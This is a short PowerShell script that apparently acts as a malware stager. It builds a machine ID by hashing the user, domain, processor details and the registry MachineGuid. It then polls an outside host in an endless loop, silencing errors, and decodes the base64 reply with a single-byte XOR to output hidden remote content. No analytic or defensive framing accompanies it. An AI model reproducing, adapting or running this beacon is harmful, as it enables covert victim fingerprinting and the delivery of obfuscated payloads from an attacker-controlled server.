[Security.Cryptography.SHA256]$sha = [Security.Cryptography.SHA256]::Create()
$macguid = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Cryptography' -Name MachineGuid).MachineGUID;
$userid = "$($env:USERDOMAIN)$($env:USERNAME)$($env:PROCESSOR_REVISION)$($env:PROCESSOR_IDENTIFIER)$($env:PROCESSOR_LEVEL)$($env:NUMBER_OF_PROCESSORS)$($macguid)";
$guid = ($sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($userid)) | ForEach-Object ToString X2) -join '';

while ($true) {
    try {
        $r = Invoke-RestMethod -Uri "http://cesareurope.com/api/v1/$($guid)"
        if ($r -ne '') {
            $buf = [Convert]::FromBase64String($r);
            for ($i = 0; $i -lt $buf.Length; $i++) {
                $buf[$i] = $buf[$i] -bxor 22;
            }
            $lines = [Text.Encoding]::ASCII.GetString($buf).Split("`r`n");

            foreach ($line in $lines) {
                Write-Output $line;
            }
            
            break;
        }
    }
    catch {
    }
    Start-Sleep 2
}